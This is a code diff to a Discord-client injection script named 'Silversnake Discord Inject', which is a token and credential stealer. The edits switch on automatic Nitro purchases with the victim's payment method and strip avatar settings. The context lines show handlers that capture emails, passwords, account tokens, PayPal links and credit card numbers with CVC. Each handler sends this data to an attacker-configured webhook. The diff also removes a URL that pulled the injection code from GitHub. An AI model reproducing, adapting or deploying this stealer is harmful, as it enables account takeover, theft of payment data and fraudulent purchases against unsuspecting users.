@@ -8,13 +8,11 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
-  auto_buy_nitro: false, 
+  auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Silversnake Discord Inject', 
-  embed_icon: '',
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
   /**
    
    **/
@@ -654,7 +652,6 @@ const login = async (email, password, token) => {
   const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -696,7 +693,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -738,7 +734,6 @@ const emailChanged = async (email, password, token) => {
   const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -780,7 +775,6 @@ const PaypalAdded = async (token) => {
   const billing = getBilling(token);
   const content = {
     username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -822,7 +816,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
   const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
@@ -866,7 +859,6 @@ const nitroBought = async (token) => {
   const content = {
     username: config.embed_name,
     content: code,
-    avatar_url: config.embed_icon,
     embeds: [
       {
         color: config.embed_color,
